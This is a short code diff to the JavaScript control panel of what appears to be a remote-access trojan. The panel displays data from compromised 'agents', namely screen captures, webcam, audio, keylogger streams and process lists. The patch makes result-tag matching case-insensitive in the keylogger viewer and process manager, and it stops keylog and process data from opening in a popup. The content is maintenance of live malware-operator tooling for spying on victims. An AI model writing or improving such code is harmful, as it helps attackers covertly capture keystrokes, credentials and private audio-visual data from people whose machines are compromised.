@@ -1190,7 +1190,7 @@
                 logTerminal(`[${cid}] ${tag}: ${snippet}${fullData.length > 300 ? '...' : ''}`, 'succ');
                 islandNotify('check-circle', `RESULT: ${tag.toUpperCase()}`, 'success', 3000);
 
-                if(fullData.length > 20 && !['screen','webcam','audio','clickscreen'].includes(tag)) {
+                if(fullData.length > 20 && !['screen','webcam','audio','clickscreen','keylog_stream','keylog_dump','ps_list','processes'].includes(tag.toLowerCase())) {
                     showResult(tag.toUpperCase() + ' — Agent ' + cid, fullData);
                 }
             });
@@ -1643,7 +1643,7 @@ function startKeylogger() {
                 let chunk = fullData;
                 try {
                     // keylog_stream data is base64 encoded
-                    if(tag === 'keylog_stream') chunk = atob(fullData);
+                    if(tag.toLowerCase() === 'keylog_stream') chunk = atob(fullData);
                 } catch(e) {}
                 
                 buf.textContent += chunk;
@@ -1705,7 +1705,7 @@ function startProcessManager() {
     // Setup specific handleResult hook for the process list
     const prevHandler = window.handleResult || function(){};
     window.handleResult = function(cid, tag, fullData) {
-        if(tag === 'ps_list' || tag === 'processes') {
+        if(tag.toLowerCase() === 'ps_list' || tag.toLowerCase() === 'processes') {
             const tbody = document.getElementById('pm-tbody');
             if(tbody) {
                 try {
